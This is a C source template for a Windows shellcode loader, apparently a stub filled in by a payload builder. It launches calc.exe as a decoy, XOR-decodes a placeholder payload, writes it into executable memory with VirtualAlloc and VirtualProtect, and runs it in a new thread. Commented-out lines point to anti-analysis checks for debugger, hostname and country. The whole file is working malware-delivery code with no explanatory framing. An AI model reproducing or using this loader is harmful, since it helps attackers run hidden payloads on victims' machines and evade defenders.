#include <windows.h>
#include <stdio.h>


void main() {
    ShellExecute(0, "open", "calc.exe", 0, 0, SW_SHOWNORMAL);

    // int is_debugged = d();
    // int size = z();
    // char *hostname = h();
    // char *country = c();
    // printf("is_debugged: %d\n", is_debugged);
    // printf("hostname: %s\n", hostname);
    // printf("size: %d\n", size);
    // printf("country: %s\n", country);
    
    unsigned char payload[] = "%SHELLCODE%";
    void* exec;
    BOOL rv;
    HANDLE th;
    DWORD old_protect;

    
    // Allocating executable memory
    exec = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // XORing shellcode
    for (size_t i = 0; i < sizeof(payload); i++) {
        payload[i] ^= %XOR_KEY%;
    }
    
    // Copy shellcode into allocated memory
    memcpy(exec, payload, sizeof(payload));

    // Changing memory protection to PAGE_EXECUTE_READ
    rv = VirtualProtect(exec, sizeof(payload), PAGE_EXECUTE_READ, &old_protect);

    // Executing shellcode in a new thread
    th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);

    WaitForSingleObject(th, -1);
}

